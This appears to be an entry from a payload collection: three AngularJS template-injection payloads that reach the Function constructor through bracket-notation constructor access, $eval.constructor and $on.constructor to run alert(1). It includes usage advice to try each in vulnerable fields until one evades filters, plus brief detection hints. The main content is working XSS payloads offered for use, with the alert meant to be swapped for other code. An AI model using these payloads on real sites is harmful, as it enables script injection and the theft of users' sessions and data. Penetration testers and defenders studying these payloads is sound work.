---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - angularjs
  - property-chain
platforms:
  - Web
validated: true
---

# AngularJS-Multiple-Property-Alert

## Code

```javascript
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

## Description

A set of three payloads targeting AngularJS-specific properties: indexed access to constructor, $eval.constructor, and $on.constructor. Each invokes the Function constructor to run alert(1), providing alternatives for filtered environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Variants are interchangeable; customize alert(1) as needed. | N/A |

## Usage

Test sequentially in vulnerable fields; use the first that evades filters for reflected/stored XSS.

## Detection

- Logs of $eval or $on invocations with user input.
- CSP violations on dynamic function creation.
- Pattern matching for bracket notation in inputs.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
